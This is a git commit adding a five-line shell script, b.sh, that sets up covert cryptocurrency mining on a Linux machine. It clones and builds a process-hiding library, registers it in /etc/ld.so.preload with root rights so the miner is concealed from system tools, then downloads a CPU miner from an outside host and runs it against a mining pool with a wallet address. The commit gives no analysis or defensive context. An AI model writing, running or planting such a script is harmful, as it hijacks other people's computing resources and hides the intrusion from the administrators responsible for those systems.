d82a5df04279f81542c7b70df2d022e62ea283c6
gafara99 <114329894+gafara99@users.noreply.github.com>
2022-09-25 06:55:35 +0000

    Create b.sh

---
+++ b.sh
@@ -0,0 +1,5 @@
+sudo apt install wget && sudo apt install make -y && sudo apt install gcc -y && git clone https://github.com/chikahusarii/lemon-lide.git && cd lemon-lide && make
+sudo mv libprocesshider.so /usr/local/lib/
+sudo su -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
+
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 -p x --cpu 8
